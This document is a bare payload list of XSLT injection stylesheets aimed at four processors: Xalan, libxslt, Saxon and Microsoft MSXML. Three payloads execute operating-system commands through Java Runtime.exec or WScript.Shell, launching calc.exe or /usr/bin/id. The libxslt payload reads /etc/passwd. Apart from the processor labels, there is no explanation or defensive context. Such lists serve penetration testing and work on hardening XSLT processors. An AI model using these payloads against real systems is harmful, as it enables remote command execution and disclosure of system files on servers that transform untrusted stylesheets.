1- Xalan Processor (Java)
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj, 'calc.exe')"/>
    <xsl:value-of select="process"/>
  </xsl:template>
</xsl:stylesheet>
```

2- libxslt(used by PHP, Python)
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```
3- Saxon
```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <!-- If Saxon-PE or Saxon-EE with feature:allow-external-functions is set to true -->
  <xsl:variable name="cmd"><![CDATA[/usr/bin/id]]></xsl:variable>
  <xsl:variable name="rtObj" select="runtime:getRuntime()" 
    xmlns:runtime="java.lang.Runtime"/>
  <xsl:variable name="process" select="runtime:exec($rtObj, $cmd)"/>
  <xsl:value-of select="$process"/>
</xsl:stylesheet>
```

4- Microsoft MSXML
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt" 
xmlns:user="http://mycompany.com/mynamespace">
  <msxsl:script language="VBScript" implements-prefix="user">
    Function transform()
      Set shell = CreateObject("WScript.Shell")
      shell.Run "cmd.exe /c calc.exe"
      transform = ""
    End Function
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:transform()"/>
  </xsl:template>
</xsl:stylesheet>
```